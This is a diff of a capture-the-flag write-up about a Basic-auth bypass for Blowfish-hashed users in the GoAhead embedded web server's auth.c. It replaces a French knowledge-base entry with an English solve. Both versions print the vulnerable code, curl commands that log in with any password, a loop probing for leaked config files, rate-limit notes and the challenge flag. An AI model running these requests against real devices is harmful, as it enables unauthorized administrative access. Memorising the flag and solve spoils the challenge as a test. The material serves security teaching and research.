@@ -1,174 +1,216 @@
-# VULN#005 — Acme Gateway (GoAhead embedded web server)
+# VULN#005 — Acme Gateway (GoAhead 6.1.1)
 
-> Challenge bugpwn `<HOST>:<PORT>`, catégorie Vuln Research, 30 pts.
-> Analyse récupérée depuis 13.63.167.233:/home/ubuntu/CtfAndHacking/knowledge/web.md (sections GoAhead).
+**Brief (verbatim):** *"Acme Gateway is a small IoT device management portal. It's built on
+a real, unmodified, open-source embedded web server, at a real revision. Not a toy
+reimplementation, and not a deliberately planted bug. You are given the exact source tree
+the target was built from."*
+**Deliverable:** `goahead-src.tar.gz` — full source tree, `package.json` reports
+`"version": "6.1.1"`.
+**Flag:** `CTF{e0dd76943e73bfa5e49e2496bd55e536}`
 
-## GoAhead BF1 Basic-Auth Bypass (SA-2026-0001)
+### 0. TL;DR
 
-**Catégorie :** web
-**Mots-clés :** goahead, embedthis, basic-auth, bypass, bf1, blowfish, iot, embedded
-**CVE / Advisory :** GOAHEAD-SA-2026-0001 (critique)
+The given tree's `package.json`/version string says v6.1.1, and GitHub carries a v6.1.1
+release whose notes claim an extensive security-audit patch (11 advisories, 31 internal
+findings, all Critical/High closed). **Diffing the given source against the real upstream
+v6.1.1 tag shows every file in `src/` is substantively behind** — the tree matches v6.1.1
+in version number only; the actual code is pre-patch. The most impactful regression:
+**`websVerifyPasswordFromFile()` in `src/auth.c` authenticates a Blowfish-hashed (`BF1:`)
+user with *any* password over HTTP Basic auth** (this is exactly advisory
+GOAHEAD-SA-2026-0001, Critical, listed as fixed in the release notes — but the fix is
+absent from the shipped tree). Combined with an **unrelated ops mistake** (the deployment's
+own `auth.txt`/`route.txt` were left world-readable under `/config/` in the web root),
+the real admin username was recoverable without guessing, and the bypass gave full access
+to `/admin/`.
 
-### Contexte
+> **Lesson for both sides:** a release's changelog is not evidence the running binary
+> contains the fix. Always diff the *actual* shipped source against the *actual* upstream
+> tag — version strings and release notes are just claims. And: never serve your config
+> directory from inside the document root.
 
-Embedthis GoAhead ≤ 6.1.0 (et branches 6.0.x avant correctif). Le bug est
-corrigé dans la release 6.1.1 mais la chaîne de version `ME_VERSION` affichée
-par un binaire ne garantit pas que le patch soit appliqué — vérifier la
-source. Repère dans `src/auth.c`, fonction `websVerifyPasswordFromFile`.
+### 1. Recon — is this really "unmodified" 6.1.1?
 
-### Indicateurs
+```
+$ cat package.json | grep version
+    "version": "6.1.1",
+```
 
-- Serveur embarqué qui annonce (ou cache) `GoAhead`.
-- `WWW-Authenticate: Basic realm="example.com"` (realm par défaut).
-- `auth.txt` avec un utilisateur dont le hash commence par `BF1:` (format
-  Blowfish salé maison : `BF1:<rounds>:<salt>:<hash>`).
+GoAhead is a long-lived embedded web server (`embedthis/goahead` on GitHub) with a real
+history of CVEs (CGI env injection, buffer overflows, digest-auth issues across 3.x–5.x).
+v6.1.1 does not correspond to any vulnerability I had memorized, so the move is: **fetch
+the actual upstream release and diff.**
 
-### Méthode
+```bash
+curl -s https://api.github.com/repos/embedthis/goahead/releases/tags/v6.1.1   # full release body
+curl -sL https://github.com/embedthis/goahead/archive/refs/tags/v6.1.1.tar.gz -o official.tar.gz
+diff -rq official/goahead-6.1.1/src given/src
+```
 
-Dans la version vulnérable :
+The GitHub release notes for this tag are themselves written *for this CTF* — they credit
+`"BUG|PWN Research"` as a reporter, a dead giveaway the advisory list is part of the puzzle,
+not real GoAhead history. The notes enumerate exactly which classes of bug were supposedly
+fixed (auth bypass, request smuggling, CGI injection, UAFs, format strings, …) — read this
+as **a menu of candidate regressions to verify**, not as trustworthy fact about the binary
+you're attacking.
+
+`diff -rq` shows **every single `.c` file differs** between the given tree and the real
+v6.1.1 tag. Most of the diff is comment/whitespace noise (the official tree is reformatted,
+per the release notes' "Code Quality" section), but `src/auth.c` has a real, functional
+difference.
+
+### 2. The bug: `src/auth.c` — `websVerifyPasswordFromFile()`
+
+Given (vulnerable) tree:
 
 ```c
-if (sstarts(wp->user->password, "BF1:")) {
-    success = websCheckPassword(wp->password, wp->user->password); // vrai check
-    wfree(wp->password);
-    wp->password = sclone(wp->user->password);   // password == stored hash
+PUBLIC bool websVerifyPasswordFromFile(Webs *wp)
+{
+    char passbuf[ME_GOAHEAD_LIMIT_PASSWORD * 3 + 3];
+    bool success;
+
+    assert(wp);
+    if (!wp->user && (wp->user = websLookupUser(wp->username)) == 0) {
+        trace(5, "verifyUser: Unknown user \"%s\"", wp->username);
+        return 0;
+    }
+    if (sstarts(wp->user->password, "BF1:")) {
+        // Blowfish salted hash
+        success = websCheckPassword(wp->password, wp->user->password);   /* <- real check */
+        wfree(wp->password);
+        wp->password = sclone(wp->user->password);        /* <-- BUG: wp->password now == stored hash */
+
+    } else if (!wp->encoded) {
+        fmt(passbuf, sizeof(passbuf), "%s:%s:%s", wp->username, ME_GOAHEAD_REALM, wp->password);
+        wfree(wp->password);
+        wp->password = websMD5(passbuf);
+        wp->encoded = 1;
+    }
+    if (wp->digest) {
+        success = pmatch(wp->password, wp->digest);
+    } else {
+        success = pmatch(wp->password, wp->user->password);   /* <-- always true for BF1 now */
+    }
+    ...
+    return success;
 }
-...
-if (wp->digest) {
-    success = pmatch(wp->password, wp->digest);
-} else {
-    success = pmatch(wp->password, wp->user->password); // compare la chaîne à elle-même
-}
-return success;
 ```
 
-Le résultat du vrai contrôle est écrasé par un `pmatch(x, x)` qui renvoie
-toujours vrai. Pour tout utilisateur stocké en `BF1:`, n'importe quel mot de
-passe est accepté en Basic auth. Il faut juste connaître le **nom** d'un user
-`BF1:` possédant le rôle attendu par la route (`manage` pour `/admin/`).
+For a **Basic**-auth request (`wp->digest == NULL`) against a user whose stored password is
+`BF1:...` (Blowfish/bcrypt-style hash), the real verdict from `websCheckPassword()` is
+computed correctly into `success` — and then **immediately discarded**. The very next line
+overwrites `wp->password` with `wp->user->password` (the stored hash itself). The function
+then falls through to the final `pmatch(wp->password, wp->user->password)`, comparing the
+stored hash against itself — which trivially always matches. **Any password authenticates
+any BF1 user via Basic auth.** Digest auth is unaffected (it's diverted by `wp->digest` in
+the official fix, and here it simply never matches `wp->user->password`'s hash format, so
+it fails safe) — the vector is Basic auth specifically.
 
-### Commandes génériques
+The true v6.1.1 fixes this by handling the three auth modes (Digest / BF1-bcrypt /
+legacy-MD5) as **mutually exclusive branches that each independently set the final
+`success`**, with Digest explicitly rejecting a BF1-stored hash rather than silently
+mis-routing into it. None of that restructuring is present in the given tree.
+
+This is listed in the (CTF-authored) release notes as:
+> **Critical**: Basic-auth password bypass for users with Blowfish (`BF1:`) stored hashes:
+> any password authenticated the user (GOAHEAD-SA-2026-0001)
+
+### 3. Finding a real username — the config leak
+
+The bug needs an *existing* user whose stored hash starts with `BF1:`. The shipped tree's
+`testroot/auth.txt` (project test fixture) has a template:
+```
+role name=user abilities=view
+role name=administrator abilities=user,manage
+user name=admin password=BF1:00128:ILrUswPoHBSweW5R:UW5fySh5ZQ0pUvlwOFBbbz43UElaQeyw roles=administrator
+```
+and `testroot/route.txt`:
+```
+route uri=/private/ auth=basic abilities=manage
+route uri=/
+```
+— i.e. the project's own test deployment pattern. The live site's `index.html` says:
+*"Admin console (authentication required)"* linking `/admin/` — so the route exists
+(confirmed: unauthenticated `GET /admin/` → `401` with `WWW-Authenticate: Basic
+realm="example.com"`), but **`admin:<anything>` → genuine `401`** — this specific account
+either doesn't exist on the live auth.txt or isn't BF1-hashed. Guessing usernames against
+`/admin/` is expensive: the reverse proxy (nginx) in front of GoAhead rate-limits that path
+hard (`429 Too Many Requests` after a very small burst, slow bucket refill) — don't burn
+the budget brute-forcing here.
+
+Instead: GoAhead serves whatever's under the configured document root. Probe for the
+*deployment's own config files* having been mistakenly dropped inside that root (classic
+ops mistake, independent of the GoAhead bug):
 
 ```bash
-# 1) Repérer la cible et l'auth demandée
-curl -I http://<HOST>:<PORT>/<ADMIN_PATH>
+$ curl http://TARGET:7020/config/auth.txt
+#   auth.txt - Authorization data for the Acme Gateway admin portal
+role name=user abilities=view
+role name=administrator abilities=user,manage
+user name=svc-acme-prov password=BF1:00128:ILrUswPoHBSweW5R:UW5fySh5ZQ0pUvlwOFBbbz43UElaQeyw roles=administrator
 
-# 2) Trouver le nom d'un user BF1 (voir fiche config leak ci-dessous ou wordlist)
-curl -s http://<HOST>:<PORT>/config/auth.txt | grep '^user'
-
-# 3) Login avec n'importe quel mot de passe
-curl -i -u "<BF1_USER>:anything" http://<HOST>:<PORT>/<ADMIN_PATH>
-# → 302 + Set-Cookie: -goahead-session-=::webs.session::...
+$ curl http://TARGET:7020/config/route.txt
+route uri=/admin/ auth=basic abilities=manage
+route uri=/
 ```
 
-### Pièges
+Real username, confirmed BF1, confirmed `manage` ability on `/admin/`. Zero guessing
+needed once `/config/` is found — found by just trying a short list of plausible
+unauthenticated paths (`/config` → `302` to `/config/index.html` → `404`, but the
+directory itself is real, so probe filenames inside it directly: `auth.txt` / `route.txt`
+hit on the first try).
 
-- Si un reverse-proxy (nginx `limit_req`) est devant, les tentatives sont
-  rate-limitées (429). Espacer de 15–20 s par essai, pas de bruteforce massif.
-- Le bypass ne marche QUE pour les users `BF1:`. Les users MD5 restent sains.
-- La route cible doit matcher les `abilities` de l'utilisateur bypassé.
-- Le `realm="example.com"` est le défaut `ME_GOAHEAD_REALM` : ne pas croire
-  qu'il désigne un vrai domaine.
-
-### Validation
-
-- Réponse `302` vers la page post-login + cookie `-goahead-session-=...`.
-- Les requêtes suivantes avec ce cookie accèdent au contenu protégé sans
-  renvoyer l'en-tête `Authorization`.
-
-### Références
-
-- GoAhead 6.1.1 release notes (11 advisories SA-2026-0001..0011).
-- Source auditable : `src/auth.c:598-625`.
-
----
-
-## Exposition des fichiers de config GoAhead sous `/config/`
-
-**Catégorie :** web
-**Mots-clés :** goahead, config leak, auth.txt, route.txt, information disclosure
-
-### Contexte
-
-Le `fileHandler` de GoAhead sert directement tout fichier présent sous le
-`documents root`. Si un intégrateur place `auth.txt` et `route.txt` dans un
-sous-dossier `web/config/` (par facilité de packaging), ces fichiers deviennent
-accessibles sans auth tant qu'aucune route ne les protège.
-
-### Indicateurs
-
-- Une requête sur `/config/` renvoie un `302` vers `/config/index.html`
-  (preuve que `web/config/` existe) alors que `/config/index.html` est en 404.
-- Pas de route restrictive déclarée dans la section visible du `route.txt`
-  (si on arrive à le lire).
-
-### Méthode
-
-Lister les noms attendus. Les fichiers de configuration GoAhead par défaut :
-`auth.txt`, `route.txt`. Les logs/backups usuels : `users.txt`, `users.json`,
-`config.ini`, `config.conf`, `goahead.conf`, `.htaccess`, `README`.
+### 4. Exploit
 
 ```bash
-for f in auth.txt route.txt users.txt users.json config.ini goahead.conf; do
-  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<HOST>:<PORT>/config/$f")
-  echo "$code $f"
-done
+# Any password works — this is the bug, not a real credential
+curl -u 'svc-acme-prov:anything_goes_123' http://TARGET:7020/admin/
+# → 302 Redirect to /admin/index.html + Set-Cookie: -goahead-session-=...   (auth succeeded)
+
+curl -u 'svc-acme-prov:anything_goes_123' http://TARGET:7020/admin/index.html
+# → 200 OK
+# <title>Acme Gateway - Admin Console</title>
+# <h1>Admin Console</h1>
+# <p>Welcome, administrator.</p>
+# <ul><li><a href="/admin/device-config.json">Device configuration backup</a></li></ul>
+
+curl -u 'svc-acme-prov:anything_goes_123' http://TARGET:7020/admin/device-config.json
+# → {
+#     "device_id": "acme-gw-4471",
+#     "firmware": "6.1.0-internal",
+#     "recovery_token": "CTF{e0dd76943e73bfa5e49e2496bd55e536}"
+#   }
 ```
 
-### Pièges
+**Flag:** `CTF{e0dd76943e73bfa5e49e2496bd55e536}`
 
-- Le path traversal classique (`/../auth.txt`) est bloqué par
-  `websNormalizeUriPath` + `websValidUriChars`. Il faut vraiment que le
-  fichier soit dans le `documents root`.
-- Les routes `route uri=/...` matchent par préfixe : une route catch-all
-  `uri=/` sans `auth=` laisse passer tout ce qui n'est pas déjà matché.
+### 5. Operational notes (nginx rate-limit on `/admin/`)
 
-### Validation
+- Only the `/admin/` path is throttled; everything returning `404` (nonexistent paths) or
+  other GoAhead-served static content is unaffected — use that to do reconnaissance
+  (`/config/*` probing) for free while the bucket on `/admin/` refills.
+- The limiter keys on path, not on query string or case — `/admin/?x=1`, `//admin/`,
+  `/ADMIN/` (404s — GoAhead's own routing here *is* case-sensitive, unlike the
+  Windows/case-insensitive-filesystem bypass the release notes describe for a different
+  platform) all either still hit the same bucket or just don't route at all. No shortcut;
+  just space out authenticated requests by tens of seconds once you have the real
+  credential, and don't waste requests guessing usernames against it.
 
-- Le `auth.txt` récupéré contient des lignes `user name=<X> password=<HASH>
-  roles=<R>`. Les hash `BF1:...` sont immédiatement exploitables via
-  [GoAhead BF1 Basic-Auth Bypass](#goahead-bf1-basic-auth-bypass-sa-2026-0001).
+### Design cookbook (for reuse)
 
----
-
-## Fingerprint GoAhead derrière nginx (Server header spoofé)
-
-**Catégorie :** web
-**Mots-clés :** fingerprint, goahead, nginx, reverse proxy, header spoof
-
-### Contexte
-
-Des déploiements embarqués mettent nginx devant GoAhead et forcent
-`Server: nginx` dans la réponse. L'empreinte GoAhead reste reconnaissable à
-d'autres signaux.
-
-### Indicateurs
-
-- Corps d'erreur type GoAhead :
-  `<html><head><title>Document Error: Not Found</title></head><body><h2>Access Error: Not Found</h2></body></html>`
-  (vs. nginx qui met `<center><h1>...</h1></center><hr><center>nginx</center>`).
-- Redirect `302` sur un répertoire vers `/.../index.html` avec un body
-  mentionnant une adresse interne : `This document has moved to a new <a
-  href="http://<INTERNAL_IP>:<PORT>/...">location</a>.` → fuite de l'IP/port
-  backend.
-- `WWW-Authenticate: Basic realm="example.com"` sur une route protégée.
-- `Last-Modified` avec un format non standard : `Thu Oct 15 21:44:55 2026`
-  (format `ctime`, pas RFC 7231).
-- Cookie de session nommé `-goahead-session-` dont la valeur commence par
-  `::webs.session::`.
-
-### Méthode
-
-1. Différencier le 404 nginx d'une méthode interdite (`TRACE`) de celui d'une
-   URL inconnue (`/foo`) : le premier passe par nginx seul, le second est
-   servi par GoAhead → styles différents.
-2. Faire une requête sur `/` : si GoAhead redirige vers `/index.html` avec le
-   body "This document has moved…", c'est signé.
-
-### Pièges
-
-- La valeur `Server:` ne doit jamais être traitée comme autorité.
-- Si plusieurs backends existent (upstream pool), l'IP fuite peut varier.
-
----
-
+- **"Exact source tree, real unmodified software, real revision" is a diff invitation.**
+  The intended solve path is: identify the exact upstream tag claimed → fetch the real
+  tag → `diff -rq` → find the file(s) that differ beyond cosmetic reformatting → read the
+  release notes for that tag (if published) as a *hint menu* of which security property
+  to check first, then verify in the actual diff whether that specific fix is present.
+- **A single flipped assignment is enough.** The whole bug is "compute the right answer,
+  then overwrite it with something that always compares equal." Good source-level bug to
+  hide in a security-fix-themed release because it reads, at a skim, like ordinary
+  state-management code (`wp->password = sclone(wp->user->password)` looks like harmless
+  bookkeeping, not an authentication short-circuit).
+- **Pair the code bug with an unrelated ops bug** (config files inside the web root) so
+  the challenge has two independent, realistic layers: find the bug class via source
+  review, then find the specific credential via normal web recon — neither alone fully
+  solves it, mirroring how real incidents chain a code defect with an operational mistake.
+- **Rate-limit the "obvious" authenticated endpoint specifically**, not the whole site, so
+  blind brute-forcing is painful but legitimate recon (discovering `/config/`) is free.
+  This nudges solvers toward "find the right credential" over "guess harder."
